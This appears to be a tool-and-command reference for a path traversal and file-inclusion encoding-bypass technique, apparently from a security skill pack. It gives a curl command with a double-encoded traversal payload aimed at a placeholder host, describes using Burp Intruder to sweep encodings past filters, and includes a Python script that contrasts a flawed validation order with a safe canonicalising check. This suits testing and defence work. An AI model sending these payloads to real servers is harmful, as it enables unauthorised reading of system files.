# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`path-traversal-and-lfi-encoding-bypass`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "https://target.example/read?path=..%252f..%252fetc%252fhostname"` | Send an encoded traversal without client-side decoding and compare against the literal form | Cross-platform |
| `Burp Suite Intruder` | `Load single, double, overlong, and backslash encodings into the path parameter` | Sweep encoding variants to find which survives the filter and resolver | Cross-platform |
| `python` | `python ordering_check.py` | Contrast validate-then-decode with decode-then-canonicalise for the same probe | Cross-platform |

## Minimal Script Shape

An ordering demonstrator: for each encoded probe it shows the verdict of a validate-then-decode filter versus a decode-then-canonicalise check, exposing the gap the first one leaves.

```python
import os
from urllib.parse import unquote

BASE = os.path.realpath("/srv/files")

def naive_then_decode(raw):
    if ".." in raw or raw.startswith("/"):
        return "rejected"
    return unquote(raw)

def decode_then_canon(raw):
    resolved = os.path.realpath(os.path.join(BASE, unquote(raw)))
    inside = resolved == BASE or resolved.startswith(BASE + os.sep)
    return resolved if inside else "rejected"

for probe in ["..%2f..%2fetc%2fhostname", "..%252f..%252fetc%252fhostname"]:
    print({"probe": probe, "validate_first": naive_then_decode(probe),
           "decode_first": decode_then_canon(probe)})
```
